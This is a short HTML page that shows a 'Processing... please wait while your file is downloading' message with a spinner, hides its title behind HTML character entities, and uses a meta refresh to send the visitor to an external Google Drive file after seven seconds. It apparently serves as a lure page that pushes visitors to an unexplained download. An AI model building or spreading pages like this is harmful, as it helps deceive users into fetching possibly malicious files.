
<html>
<head>
<link rel="shortcut icon" href="favicon.ico" type="image/x-icon"/>

<meta http-equiv="refresh" content="7; https://drive.google.com/open?id=1PoUpXu245w5B3ssActnqxHJmrE3vjYWC">

<title>&#68;&#111;&#119;&#110;&#108;&#111;&#97;&#100;&#105;&#110;&#103; </title></head>
</head>

<br><br>

<table><tr>

<td width="30"></td>

<td>

	<img src="https://i.imgur.com/iLNxAnb.gif" width="50" height="50">
</td>



<td width="5"></td>



<td>
	
	<font face="verdana" size="3">
	<b>Processing... </b>
	<br>
	<font size="2"> Please wait while your file is downloading  !</font>
	</font>

</td>

</tr></table>

<body>

</body>
</html>